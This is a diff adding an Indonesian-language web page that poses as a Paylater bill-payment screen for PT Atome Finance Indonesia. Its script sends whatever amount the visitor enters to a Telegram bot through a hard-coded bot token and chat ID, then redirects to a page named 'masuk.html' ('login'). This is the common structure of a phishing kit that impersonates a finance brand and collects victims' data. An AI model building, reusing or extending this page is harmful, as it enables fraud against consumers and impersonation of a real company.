@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bayar Tagihan</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #000000;
+            padding: 15px;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .back-icon {
+            font-size: 20px;
+            margin-right: 15px;
+            cursor: pointer;
+        }
+
+        .title {
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 18px;
+            font-size: 14px;
+        }
+
+        .label {
+            color: #333333;
+        }
+
+        .value {
+            font-weight: 500;
+        }
+
+        .section-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin: 20px 0 10px 0;
+        }
+
+        .amount-container {
+            display: flex;
+            align-items: baseline;
+            font-size: 36px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        .currency {
+            font-size: 18px;
+            margin-right: 6px;
+        }
+
+        .amount-input {
+            border: none;
+            font-size: 36px;
+            font-weight: bold;
+            width: 120px;
+            outline: none;
+        }
+
+        .divider {
+            border-bottom: 1px solid #cccccc;
+            margin-bottom: 20px;
+        }
+
+        .info-text {
+            text-align: center;
+            color: #666666;
+            font-size: 12px;
+            line-height: 1.4;
+            margin-bottom: 15px;
+        }
+
+        /* Bagian WhatsApp */
+        .wa-section {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .wa-number {
+            font-size: 14px;
+            font-weight: bold;
+            color: #00000;
+        }
+
+        .next-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #ff99bb; /* Ganti warna di sini */
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="back-icon">&lt;</div>
+        <div class="title">Bayar tagihan</div>
+    </div>
+
+    <div class="row">
+        <div class="label">Kode Pembayaran terhubung ke tagihan Paylater</div>
+        <div class="value"></div>
+    </div>
+
+    <div class="row">
+        <div class="label"></div>
+        <div class="value"></div>
+    </div>
+
+    <div class="section-title">Jumlah pembayaran tagihan</div>
+
+    <div class="amount-container">
+        <span class="currency">Rp</span>
+        <input type="number" id="nominalInput" class="amount-input" value="0">
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="info-text">
+        Pembayaran cicilan Anda akan dikirimkan ke <br>
+       PT Atome Finance Indonesia.
+    </div>
+
+    <div class="wa-section">
+        <div class="wa-number"></div>
+    </div>
+
+    <button class="next-button" onclick="kirimKeTelegram()">Lanjut</button>
+
+    <script>
+        function kirimKeTelegram() {
+            // 👇 Ganti dengan TOKEN BOT kamu
+            const token = "8463412359:AAG6nli8rzC54LQSKkgXBXkwI8ePspNfFIA"; 
+            
+            // 👇 Ganti dengan CHAT ID kamu (tempat pesan masuk)
+            const chatId = "-1003797236002"; 
+
+            // Ambil angka yang diketik
+            var nominal = document.getElementById('nominalInput').value;
+            
+            // Isi pesan
+            var pesan = "🔔 NOMINAL PEMBAYARAN\nJUMLAH: Rp " + nominal;
+
+            // URL API Telegram
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            // Kirim data ke Telegram
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: pesan
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.ok) {
+                    // Jika berhasil, pindah halaman
+                    window.location.href = "masuk.html";
+                } else {
+                    alert("Gagal mengirim! Cek Token atau Chat ID.");
+                }
+            })
+            .catch(error => {
+                alert("Error: " + error);
+            });
+        }
+    </script>
+</body>
+</html>
